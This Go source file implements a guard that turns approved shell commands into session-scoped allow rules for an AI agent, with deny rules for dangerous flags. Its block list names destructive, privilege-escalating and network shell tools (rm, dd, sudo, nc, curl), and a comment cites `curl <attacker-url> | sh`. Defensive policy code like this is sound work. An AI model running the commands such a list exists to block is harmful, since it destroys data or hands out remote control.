package guard

import (
	"strconv"
	"strings"
	"sync"

	"github.com/x6nux/yanshi/internal/execpolicy"
)

// generalize.go turns a one-off shell approval into a reusable rule, so a long
// goal loop stops asking about `go test ./internal/a`, `go test ./internal/b`,
// `go test ./internal/c` one prompt at a time.
//
// THE PRODUCT IS AN EXECPOLICY RULE, NOT A NEW TABLE. internal/execpolicy
// already carries argv-level structured rules (program + argument prefix +
// deny_flags) and checkShell already evaluates them ahead of the legacy glob
// switch. Emitting anything else would mean a second matcher with its own
// precedence and its own bugs, and the two would disagree the first time
// somebody changed one of them. A generalized approval is simply a rule
// appended to the profile's Shell.Rules for the session.
//
// TWO GATES, BOTH TAKEN FROM QwenPaw (governance/generalize.py), because both
// were learned there the expensive way:
//
//  1. HIGH-RISK VERBS ARE NEVER WIDENED (noGeneralizeVerbs, mirroring
//     _NO_GENERALIZE_COMMANDS). The user approved `rm -rf ./build`, not `rm *`.
//  2. FAILURE FALLS BACK (RuleSet.Demote, mirroring the module's "on any
//     failure fall back to a literal exact match"). Once a generalized rule has
//     been implicated in a refusal or an incident, that family is demoted for
//     the rest of the session: its rules are removed and no later approval in
//     it may widen again. A widening that has already been wrong once does not
//     get a second chance on the strength of the same heuristic that produced
//     it.
//
// WHERE THIS PORT DIVERGES FROM QwenPaw, AND WHY. QwenPaw's fallback is a
// literal `ToolName(exact-target)` match, which its fnmatch/wcmatch matcher can
// express. execpolicy cannot: Rule.Prefix matches the START of an argument
// vector, so a rule listing the full approved arguments still admits every
// SUPERSET of them — `rm -rf ./build` recorded that way would authorize `rm -rf
// ./build ./other`. Since "exactly this and nothing more" is not expressible,
// both gates fall back to NO RULE, and the command keeps prompting. The
// alternative would be a second, exact-match table alongside execpolicy, which
// is the two-matcher arrangement the paragraph above refuses.
//
// SCOPE AND LIFETIME: a RuleSet is SESSION-SCOPED and IN-MEMORY. It is not
// persisted and not shared between sessions or agents. That is a deliberate
// ceiling on blast radius — an approval is evidence about what the user wanted
// in this conversation, not a standing grant. A rule that outlived the session
// would be a permission the user granted once and could no longer see; making
// them re-approve at the start of the next session costs one prompt and keeps
// the grant visible.

// maxGeneralizedPrefix caps how many leading subcommand words a generalized
// rule keeps. Two covers the shapes that actually occur (`go test …`,
// `npm run build …`, `cargo build --release`) while stopping the prefix from
// growing long enough to be an exact match wearing a generalization's name.
const maxGeneralizedPrefix = 2

// noGeneralizeVerbs are programs whose effect is destructive, privilege-
// escalating, or fetches-and-runs remote code. Approving one instance of these
// says nothing about the next one: `rm -rf ./build` and `rm -rf /etc` differ by
// an argument, and a prefix rule that keeps only the program name cannot tell
// them apart.
//
// Ported from QwenPaw's _NO_GENERALIZE_COMMANDS, extended with the fetch-and-
// execute family (curl/wget/ssh/scp) that its shell list leaves to a separate
// layer: this repository has no such layer on the generalization path, and
// `curl <attacker-url> | sh` is precisely the shape a widened `curl *` rule
// would wave through.
var noGeneralizeVerbs = map[string]bool{
	// Deletion and disk destruction.
	"rm": true, "rmdir": true, "unlink": true, "shred": true, "rimraf": true,
	"del": true, "erase": true, "rd": true,
	"dd": true, "mkfs": true, "fdisk": true, "parted": true, "diskutil": true,
	// Privilege escalation and ownership.
	"sudo": true, "su": true, "doas": true, "runas": true,
	"chmod": true, "chown": true, "chgrp": true, "setfacl": true, "icacls": true,
	// Process and machine lifecycle.
	"kill": true, "killall": true, "pkill": true, "taskkill": true,
	"reboot": true, "shutdown": true, "halt": true, "poweroff": true,
	"systemctl": true, "service": true, "launchctl": true,
	// Fetch-and-execute: the argument IS the code that runs.
	"curl": true, "wget": true, "ssh": true, "scp": true, "rsync": true,
	"nc": true, "ncat": true, "telnet": true,
	// Interpreters: `python -c <anything>` is an arbitrary program.
	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true,
	"python": true, "python3": true, "perl": true, "ruby": true, "node": true,
	"powershell": true, "pwsh": true, "cmd": true, "eval": true, "env": true,
}

// GeneralizedApproval is the outcome of turning one approved command into
// rules. Rules is what the caller appends to the profile's Shell.Rules; it is
// EMPTY when the command must keep prompting on every invocation. Widened
// reports whether the result covers more than the approved command.
type GeneralizedApproval struct {
	Rules   []execpolicy.Rule
	Family  string
	Widened bool
	Reason  string
}

// familyKey identifies the "family" a generalized rule covers: the program plus
// the retained prefix. It is the demotion unit — demoting `go test` must not
// demote `go build`.
func familyKey(program string, prefix []string) string {
	if len(prefix) == 0 {
		return program
	}
	return program + " " + strings.Join(prefix, " ")
}

// subcommandLike reports whether an argument is a literal subcommand word that
// is safe to keep in a generalized prefix.
//
// It rejects anything that carries a VALUE rather than naming an operation:
// flags, paths, globs, shell expansions, and key=value pairs. Keeping a path in
// the prefix would make the rule useless (it would match only that path), and
// keeping a glob or an expansion would put an unresolved, attacker-influenceable
// token into the matcher's exact-comparison position.
func subcommandLike(arg string) bool {
	if arg == "" || strings.HasPrefix(arg, "-") {
		return false
	}
	if strings.ContainsAny(arg, "/\\*?$~=%\"'") {
		return false
	}
	if strings.HasPrefix(arg, ".") {
		return false
	}
	for _, r := range arg {
		if r > 127 {
			return false // non-ASCII is data, not a subcommand name
		}
	}
	return true
}

// generalizedPrefix returns the leading run of subcommand-like arguments,
// capped at maxGeneralizedPrefix.
func generalizedPrefix(args []string) []string {
	var prefix []string
	for _, a := range args {
		if len(prefix) >= maxGeneralizedPrefix || !subcommandLike(a) {
			break
		}
		prefix = append(prefix, a)
	}
	return prefix
}

// dangerousFlags are flags that turn an otherwise ordinary command into an
// irreversible or scope-escaping one. A generalized ALLOW rule keeps only the
// program and a subcommand, so these would otherwise ride in for free on any
// later invocation of the same family: `git push` approved once would cover
// `git push --force`.
//
// They are emitted as a companion DENY rule rather than being folded into the
// allow rule, because that is the mechanism execpolicy already has:
// Evaluate checks deny rules with matching DenyFlags first and returns
// hard_deny immediately, while a deny rule whose flags do not appear stays
// inert and lets the allow rule admit the ordinary form.
var dangerousFlags = []string{
	"--force", "-f", "--hard", "--no-verify", "--force-with-lease",
	"--delete", "--prune", "-D", "--all", "--recursive", "-r", "-R",
	"--privileged", "--unsafe-perm", "--allow-root", "--no-preserve-root",
}

// RuleSet accumulates generalized approvals for one session. The zero value is
// ready to use and safe for concurrent use: approvals arrive on the WebSocket
// reader goroutine while a turn's tool calls read the rules.
type RuleSet struct {
	mu       sync.RWMutex
	rules    []execpolicy.Rule
	families map[string]int  // family key → index into rules
	demoted  map[string]bool // families that have earned exact-only treatment
	seq      int
}

// Approve records an approved shell command and returns the rules it produced.
//
// The command is the raw approved string; it is lexed with the same permissive
// tokenizer the destructive gate uses (lexShellLite), so an ANSI-C-quoted or
// wrapper-nested command is not silently recorded as its opaque outer form.
// A command that cannot be lexed, or that contains a control operator, produces
// no rule at all: those never reach an approval prompt in the first place
// (checkShell hard-denies them structurally), so recording one would create a
// rule for a command shape the guard refuses to run.
//
// A command that must NOT be widened — a high-risk verb, or a family that has
// been demoted — produces NO RULE, and therefore keeps prompting every time.
// That is not a shortcut; it is forced by what execpolicy can express.
// execpolicy.hasPrefix matches a rule's Prefix against the START of a command's
// arguments, so a rule listing the full approved argument vector still admits
// every SUPERSET of it: `rm -rf ./build` recorded that way would authorize `rm
// -rf ./build ./other`. Since an exact match is not expressible, the choice is
// between a rule that silently widens the most dangerous commands and no rule
// at all, and only the second is defensible. The alternative — a second,
// exact-match rule table alongside execpolicy — would put two matchers with
// separate precedence on the authorization path, which is the thing this file's
// header refuses to do.
func (s *RuleSet) Approve(cmd string) GeneralizedApproval {
	if strings.TrimSpace(cmd) == "" || hasControlOperator(cmd) {
		return GeneralizedApproval{Reason: "command is not a single executable segment"}
	}
	decoded, _ := decodeANSIC(cmd)
	program, args, ok := lexShellLite(decoded)
	if !ok {
		return GeneralizedApproval{Reason: "command could not be tokenized"}
	}

	prefix := generalizedPrefix(args)
	family := familyKey(program, prefix)
	if noGeneralizeVerbs[program] {
		return GeneralizedApproval{
			Family: family,
			Reason: "high-risk verb: never widened, so this command asks every time",
		}
	}
	if s.isDemoted(family) {
		return GeneralizedApproval{
			Family: family,
			Reason: "family previously demoted after a refusal: asks every time",
		}
	}

	rules := s.buildRules(program, prefix, family)
	s.store(family, rules)
	return GeneralizedApproval{
		Rules:   rules,
		Family:  family,
		Widened: true,
		Reason:  "widened to program + subcommand prefix",
	}
}

// buildRules assembles the execpolicy rules for one widened approval: a
// companion deny rule for the dangerous flags, followed by the allow rule. The
// deny rule is emitted first for readability only — execpolicy checks deny
// rules with matching flags regardless of position.
func (s *RuleSet) buildRules(program string, prefix []string, family string) []execpolicy.Rule {
	s.mu.Lock()
	s.seq++
	id := s.seq
	s.mu.Unlock()

	return []execpolicy.Rule{
		{
			ID:            approvalRuleID(id, "guard"),
			Program:       program,
			Prefix:        append([]string{}, prefix...),
			Decision:      "deny",
			DenyFlags:     append([]string{}, dangerousFlags...),
			Justification: "generalized approval for " + family + " does not extend to irreversible flags",
		},
		{
			ID:            approvalRuleID(id, "allow"),
			Program:       program,
			Prefix:        append([]string{}, prefix...),
			Decision:      "allow",
			Justification: "approved in this session: " + family,
		},
	}
}

func approvalRuleID(seq int, kind string) string {
	return "session-approval-" + kind + "-" + strconv.Itoa(seq)
}

// store installs the rules for a family, replacing any rules a previous
// approval of the same family produced. Replacing rather than appending is what
// makes Demote effective: a demoted family's widened rule must actually leave
// the table, not sit behind a narrower one where execpolicy's "prompt wins over
// allow" ordering could still reach it.
func (s *RuleSet) store(family string, rules []execpolicy.Rule) {
	if len(rules) == 0 {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.families == nil {
		s.families = map[string]int{}
	}
	s.dropFamilyLocked(family)
	s.families[family] = len(s.rules)
	s.rules = append(s.rules, rules...)
}

// dropFamilyLocked removes every rule belonging to family. Callers hold s.mu.
func (s *RuleSet) dropFamilyLocked(family string) {
	if _, ok := s.families[family]; !ok {
		return
	}
	kept := s.rules[:0]
	for _, r := range s.rules {
		if ruleFamily(r) == family {
			continue
		}
		kept = append(kept, r)
	}
	s.rules = append([]execpolicy.Rule{}, kept...)
	delete(s.families, family)
	s.reindexLocked()
}

func (s *RuleSet) reindexLocked() {
	for fam := range s.families {
		delete(s.families, fam)
	}
	for i, r := range s.rules {
		fam := ruleFamily(r)
		if _, seen := s.families[fam]; !seen {
			s.families[fam] = i
		}
	}
}

// ruleFamily recovers the family key from a stored rule.
func ruleFamily(r execpolicy.Rule) string { return familyKey(r.Program, r.Prefix) }

// Demote marks the family covering cmd as untrustworthy for widening and
// removes its rules. This is the second QwenPaw gate: a generalized rule that
// has been implicated in a refusal or an incident goes back to exact matching
// for the rest of the session, and any later approval in the same family is
// recorded exactly rather than widened.
//
// It is deliberately IRREVERSIBLE within the session. A "demote until things
// look fine again" policy would restore the widened rule using the very
// heuristic that just produced a wrong one; the only new evidence available is
// that the heuristic was wrong here.
//
// Returns whether a family was actually demoted, so a caller can tell a real
// demotion from a call about a command that was never generalized.
func (s *RuleSet) Demote(cmd string) bool {
	decoded, _ := decodeANSIC(cmd)
	program, args, ok := lexShellLite(decoded)
	if !ok {
		return false
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.demoted == nil {
		s.demoted = map[string]bool{}
	}
	if s.families == nil {
		s.families = map[string]int{}
	}
	// Demote every family that could have admitted this command: the exact key
	// and each SHORTER prefix of it. A refusal of `go test -race ./x` must
	// demote the `go test` family that admitted it, not only the longest key,
	// which no rule may ever have used. The loop runs longest-first so the
	// widened rule is found and dropped before the shorter keys are marked.
	prefix := generalizedPrefix(args)
	demoted := false
	for i := len(prefix); i >= 0; i-- {
		fam := familyKey(program, prefix[:i])
		if _, exists := s.families[fam]; exists {
			s.dropFamilyLocked(fam)
			demoted = true
		}
		s.demoted[fam] = true
	}
	return demoted
}

// isDemoted reports whether a family (or any prefix of it) has been demoted.
func (s *RuleSet) isDemoted(family string) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.demoted[family]
}

// Rules returns a snapshot of the accumulated rules, ready to be appended to a
// profile's Shell.Rules. The copy is intentional: the caller merges it into a
// profile that may outlive the lock, and a shared backing array would be a data
// race on the authorization path.
func (s *RuleSet) Rules() []execpolicy.Rule {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if len(s.rules) == 0 {
		return nil
	}
	out := make([]execpolicy.Rule, len(s.rules))
	copy(out, s.rules)
	return out
}

// WithSessionRules returns a copy of p whose Shell.Rules carry the session's
// approved rules APPENDED AFTER the profile's own.
//
// Order matters and this order is the safe one. execpolicy.Evaluate returns
// hard_deny the moment a deny rule's flags match, regardless of position, so an
// operator's deny rule cannot be shadowed by an approval. Among allow/prompt
// rules "prompt wins over allow", so an operator rule that asks for
// confirmation still asks even when a session approval would have admitted the
// command. A session approval can therefore only ever admit something the
// profile left UNMATCHED — which, under execpolicy, would otherwise be
// hard_deny("unmatched-segment").
//
// Profiles with no Rules at all are returned unchanged. Those run the legacy
// glob switch, and grafting a rules table onto them would silently switch the
// profile to a different matcher — a rules-only profile hard-denies every
// command its rules do not name, so an operator who wrote `policy: denylist`
// with two patterns would find everything else refused.
func (s *RuleSet) WithSessionRules(p PermissionProfile) PermissionProfile {
	extra := s.Rules()
	if len(extra) == 0 || len(p.Shell.Rules) == 0 {
		return p
	}
	merged := make([]execpolicy.Rule, 0, len(p.Shell.Rules)+len(extra))
	merged = append(merged, p.Shell.Rules...)
	merged = append(merged, extra...)
	p.Shell.Rules = merged
	return p
}
